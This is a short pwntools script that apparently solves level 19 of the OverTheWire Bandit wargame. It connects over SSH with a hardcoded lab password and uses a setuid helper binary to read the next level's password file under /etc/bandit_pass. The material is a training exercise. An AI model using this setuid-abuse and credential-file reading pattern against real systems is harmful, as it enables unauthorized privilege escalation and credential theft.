#!/usr/bin/env python2
from pwn import *
from pygments import highlight
from pygments.lexers import CLexer
from pygments.formatters import TerminalFormatter
from pwnlib.util.fiddling import randoms
from time import sleep

level = 19
user = 'bandit%s' % level
host = 'bandit.labs.overthewire.org'
password = 'IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x'
port = 2220

def connectToLevel():
    return ssh(user=user, host=host, port=port, password=password)

context(arch='i386', os='linux')

sh = connectToLevel()
p = sh.process("./bandit20-do cat /etc/bandit_pass/bandit20",shell=True)
log.info('Flag = %s' % p.recvline())
